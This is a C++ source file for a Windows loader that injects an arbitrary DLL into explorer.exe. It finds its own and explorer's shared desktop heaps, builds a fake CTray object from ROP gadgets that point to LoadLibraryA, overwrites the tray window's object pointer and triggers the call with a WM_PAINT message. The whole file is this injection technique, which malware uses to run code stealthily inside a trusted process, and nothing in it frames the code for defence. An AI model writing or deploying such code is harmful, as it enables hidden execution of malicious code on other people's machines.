#include "Loader.h"

#include "ProcessUtils.h"

#include <io.h>
#include <stdexcept>


ULONG Loader::s_Magics[NUM_OF_MAGICS] = { 0xABABABAB, 0xCDCDCDCD, 0xABABABAB, 0xCDCDCDCD };

Loader::GADGET Loader::s_Gadgets[] = {
#ifdef _WIN64
	{ "\xC3", 2, NULL, NULL, 0, EXACT_GADGET },
#else
	{ "\xFD\xC3", 2, NULL, NULL, 0, EXACT_GADGET }, /*std,ret;*/
	{ "\xFC\xC3", 2, NULL, NULL, 0, EXACT_GADGET }, /*cld,ret;*/
	{ "\x58\xc3", 2, NULL, NULL, 0, EXACT_GADGET }, /*pop rax,ret;*/
	{ "\xFF\xE0", 2, NULL, NULL, 0, EXACT_GADGET }, /*jmp rax*/
	{ "\xB9\x94\x00\x00\x00\xF3\xA5\x5F\x33\xC0\x5E\x5D\xC2\x08\x00", 15, NULL, NULL, 0, EXACT_GADGET },
	{ "\xFF\xD0\xC3", 3, NULL, NULL, 0, EXACT_GADGET }, /*call rbx,ret;*/
#endif
	{ NULL, 0, NULL, NULL, 0 }
};

#define GADGET_ADDRESS(g) ((SIZE_T)(g).ModuleBase + (SIZE_T)(g).Offset)

Loader::Loader(HINSTANCE hInstance)
{
	// Perform application initialization
	if (!hInstance)
		throw std::runtime_error("ldr_initialization_failed");
	m_hInstance = hInstance;

	RegisterLoaderClass();

	m_hWnd = CreateWindow(LDRCLASS, LDRTITLE, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, NULL, NULL, m_hInstance, NULL);
	if (!m_hWnd)
		throw std::runtime_error("ldr_initialization_failed");

	m_hShell32 = LoadLibrary(_T("Shell32.dll"));
	if (!m_hShell32)
		throw std::runtime_error("ldr_initialization_failed");
}

Loader::~Loader()
{
	FreeLibrary(m_hShell32);
}

BOOL Loader::Inject(const TCHAR* dllPath)
{
	BOOL ret = TRUE;
	DWORD pid = 0;
	HANDLE ExplorerHandle = 0;

	// Check if dll file exists
	if (_taccess(dllPath, 0x00) == -1) 
	{
		MessageBox(m_hWnd, _T("File to load \"%s\". File does not exist!\n"), LDRTITLE, MB_ICONERROR);
		goto fail;
	}

	// Find the desktop heap in the current process
	SIZE_T SharedHeapSize = 0;
	SIZE_T WindowBufferOffset = 0;
	PVOID DesktopHeapBase = FindLoaderDesktopHeap(&WindowBufferOffset, &SharedHeapSize);
	if (!DesktopHeapBase)
		goto fail;

	m_WindowBufferOffset = WindowBufferOffset;
	m_SharedHeapSize = SharedHeapSize;
	m_pLoaderDesktopHeap = DesktopHeapBase;

	// Get the PID for explorer.exe
	pid = ProcessUtils::GetPidByName(_T("explorer.exe"));
	if (!pid) 
		goto fail;

	m_dwExplorerPid = pid;

	// Open explorer.exe
	ExplorerHandle = ProcessUtils::Open(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION, pid);
	if (!ExplorerHandle)
		goto fail;

	m_hExplorerHandle = ExplorerHandle;

	// Find Explorer's desktop heap
	PVOID ExplorerDesktopHeap = ProcessUtils::FindProcessDesktopHeap(m_hExplorerHandle, SharedHeapSize);
	if (!ExplorerDesktopHeap)
		goto fail;

	m_pExplorerSharedHeap = ExplorerDesktopHeap;

	// Find the target window
	HWND hShellTrayWnd = FindWindow(_T("Shell_TrayWnd"), NULL);
	if (!hShellTrayWnd)
		goto fail;

	// Get the CTray object
	PVOID CTrayObj = (PVOID)GetWindowLongPtr(hShellTrayWnd, 0);
	if (!CTrayObj)
		goto fail;

	// Build the attack buffer on the window.
	PVOID MaliciousCTrayObj = BuildAttackBuffer(dllPath);
	if (!MaliciousCTrayObj)
		goto fail;

	// Overwrite the CTray Object
	SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)MaliciousCTrayObj);
	// Trigger the injection
	SendNotifyMessage(hShellTrayWnd, WM_PAINT, 0xABABABAB, 0);
	// Wait For It
	Sleep(500);
	// Restore Old Object
	SetWindowLongPtr(hShellTrayWnd, 0, (LONG_PTR)CTrayObj);

clean:
	ProcessUtils::Close(ExplorerHandle);
	return ret;
fail:
	ret = FALSE;
	goto clean;
}

PVOID Loader::FindLoaderDesktopHeap(SIZE_T * MagicOffset, SIZE_T * size)
{
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	BYTE *Addr = (BYTE*)0x1000;
	PBYTE tmp;
	ULONG OldProt = 0;

	// Insert the magics we will look for.
	for (UINT i = 0; i < NUM_OF_MAGICS; i++)
	{
		SetLastError(0);
		SetWindowLong(m_hWnd, i * sizeof(ULONG), s_Magics[i]);
		if (GetLastError() != 0) 
			return 0;
	}

	// Try to find the magics.
	while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect == PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
		{
			tmp = SearchMemory((PBYTE)MemInfo.BaseAddress, MemInfo.RegionSize, (PBYTE)s_Magics, sizeof(s_Magics));
			if (tmp && !VirtualProtect(Addr, 0x1000, PAGE_READWRITE, &OldProt))
			{
				// return section information.
				*size = MemInfo.RegionSize;
				*MagicOffset = (SIZE_T)tmp - (SIZE_T)MemInfo.AllocationBase;
				return MemInfo.BaseAddress;
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return 0;
}

PVOID Loader::FindExplorerDesktopHeap(SIZE_T HeapSize)
{
	BYTE *Addr = (BYTE*)0x1000;
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	ULONG OldProt = 0;

	if (!m_hExplorerHandle)
		return 0;

	while (VirtualQueryEx(m_hExplorerHandle, Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect == PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT && MemInfo.RegionSize == HeapSize)
		{
			// Double check.
			if (!VirtualProtectEx(m_hExplorerHandle, Addr, 0x1000, PAGE_READWRITE, &OldProt))
				return MemInfo.BaseAddress;
			else
				VirtualProtectEx(m_hExplorerHandle, Addr, 0x1000, OldProt, &OldProt);
		}
		Addr += MemInfo.RegionSize;
	}

	return 0;
}

PVOID Loader::BuildAttackBuffer(const TCHAR * dllPath)
{
	PVOID pfnLoadLibrary = (PVOID)GetProcAddress(LoadLibrary(_T("kernel32.dll")), "LoadLibraryA");
	UINT CurrIndex = 0;
#define _fnINSTRINGNULL_INDEX 0x1B

	// Get the callback table.
	PTEB Teb = NtCurrentTeb();
	PBYTE Peb = (PBYTE)Teb->ProcessEnvironmentBlock;
	PVOID* CallbackTable = *(PVOID**)((PBYTE)Peb + 0x58);
	PVOID TargetFunction = CallbackTable[_fnINSTRINGNULL_INDEX];

#define SET_LONG(value) SetWindowLongPtr(m_hWnd, CurrIndex  * sizeof(LONG_PTR), (LONG_PTR)value);CurrIndex++;

	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + 16);
	SET_LONG(0); // Must be zero 
	SET_LONG(TargetFunction); // Make it point to target function
	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // This should point to ret
	SET_LONG(GADGET_ADDRESS(s_Gadgets[0])); // This should point to ret
	SET_LONG((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset + (CurrIndex + 5) * sizeof(LONG_PTR)); // This should point to the library to load    
	SET_LONG(5);
	SET_LONG(6);
	SET_LONG(7);
	SET_LONG(pfnLoadLibrary); // This is the LoadLibraryFunction

	SetLibraryPath(dllPath, CurrIndex);

	//SET_LONG(0x6C6C642E785C3A63); // This is c:\\x.dll
#undef SET_LONG

	return (PVOID)((size_t)m_pExplorerSharedHeap + m_WindowBufferOffset);
}

void Loader::SetLibraryPath(const TCHAR * path, UINT & currentIndex)
{
	char szDllPath[MAX_PATH] = { 0 };

#ifdef UNICODE
	size_t converted = 0;
	wcstombs_s(&converted, szDllPath, path, sizeof(szDllPath));
#else
	strcpy_s(szDllPath, path);
#endif

	// Now we write the library to load
	ULONG dllLocationLength = (ULONG)strlen(szDllPath);
	ULONG dllLocationDiv = dllLocationLength / sizeof(LONG_PTR);
	ULONG dllLocationRemainder = dllLocationLength % sizeof(LONG_PTR);

	const int finalDllLocationSize = (dllLocationDiv * sizeof(LONG_PTR)) + dllLocationRemainder + 1;
	char* finalDllLocation = new char[finalDllLocationSize];
	strcpy_s(finalDllLocation, finalDllLocationSize, szDllPath);

	for (ULONG i = 0; i <= dllLocationDiv; ++i)
	{
		char* ptr = finalDllLocation + (sizeof(LONG_PTR) * i);
		SetWindowLongPtr(m_hWnd, currentIndex * sizeof(LONG_PTR), *(LONG_PTR*)ptr); currentIndex++;
	}

	SetWindowLongPtr(m_hWnd, currentIndex * sizeof(LONG_PTR), (LONG_PTR)0); currentIndex++;
}

PBYTE Loader::SearchMemory(PBYTE Start, SIZE_T Size, PBYTE Buffer, SIZE_T BufLen)
{
	while (Size > BufLen)
	{
		if (memcmp(Start, Buffer, BufLen) == 0)
			return Start;
		Start++;
		Size--;
	}
	return 0;
}

ATOM Loader::RegisterLoaderClass()
{
	WNDCLASSEX wcex = { 0 };
	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style = CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc = DefWindowProc;
	wcex.cbClsExtra = 0;
	wcex.cbWndExtra = 0x200;
	wcex.hInstance = m_hInstance;
	wcex.hIcon = NULL;
	wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wcex.lpszMenuName = NULL;
	wcex.lpszClassName = LDRCLASS;
	wcex.hIconSm = NULL;
	return RegisterClassEx(&wcex);
}